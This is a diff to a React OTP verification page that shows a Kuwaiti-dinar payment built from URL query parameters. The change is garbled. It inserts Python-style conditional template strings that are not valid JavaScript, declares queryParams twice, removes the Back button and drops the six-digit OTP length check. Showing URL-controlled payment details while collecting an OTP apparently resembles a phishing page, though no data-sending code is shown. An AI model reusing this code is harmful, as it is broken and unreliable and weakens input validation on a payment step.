@@ -3,10 +3,10 @@ import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 
 const defaultPaymentData = {
-  customerName: "يوسف غازي الرشيدي",
-  amount: 30.000,
+  customerName: "{paymentData.customerName if typeof paymentData !== 'undefined' else currentPayment.customerName}",
+  amount: {paymentData.amount if typeof paymentData !== 'undefined' else currentPayment.amount},
   currency: "KWD",
-  description: "Family Support"
+  description: "{paymentData.description if typeof paymentData !== 'undefined' else currentPayment.description}"
 };
 
 const OTPVerification = () => {
@@ -16,11 +16,12 @@ const OTPVerification = () => {
   const [loading, setLoading] = useState(false);
 
   const queryParams = new URLSearchParams(window.location.search);
+    const queryParams = new URLSearchParams(window.location.search);
   const paymentData = {
-    customerName: queryParams.get('n') || defaultPaymentData.customerName,
-    amount: parseFloat(queryParams.get('a') || String(defaultPaymentData.amount)),
-    currency: queryParams.get('c') || defaultPaymentData.currency,
-    description: queryParams.get('p') || defaultPaymentData.description
+    customerName: queryParams.get('n') || "{paymentData.customerName if typeof paymentData !== 'undefined' else currentPayment.customerName}",
+    amount: queryParams.get('a') || "{paymentData.amount if typeof paymentData !== 'undefined' else currentPayment.amount}",
+    currency: queryParams.get('c') || "د.ك",
+    description: queryParams.get('p') || "{paymentData.description if typeof paymentData !== 'undefined' else currentPayment.description}"
   };
 
   const handleSubmit = (e: React.FormEvent) => {
@@ -104,21 +105,13 @@ const OTPVerification = () => {
                 </InputOTP>
               </div>
               
-                            <div className="flex space-x-3 sm:space-x-4 mt-6">
-                <button
-                  type="button"
-                  onClick={handleCancel}
-                  className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
-                  disabled={loading}
-                >
-                  Back
-                </button>
+                                          <div className="flex space-x-3 sm:space-x-4 mt-6">
                 <button
                   type="submit"
                   className="flex-1 bg-blue-700 text-white py-3 sm:py-4 rounded-lg text-base sm:text-lg font-bold hover:bg-blue-800 transition-colors shadow-md disabled:opacity-50"
-                  disabled={loading || otp.length !== 6}
+                  disabled={loading}
                 >
-                  {loading ? 'Verifying...' : 'Verify'}
+                  {loading ? '...' : 'Verify'}
                 </button>
               </div>
             </div>
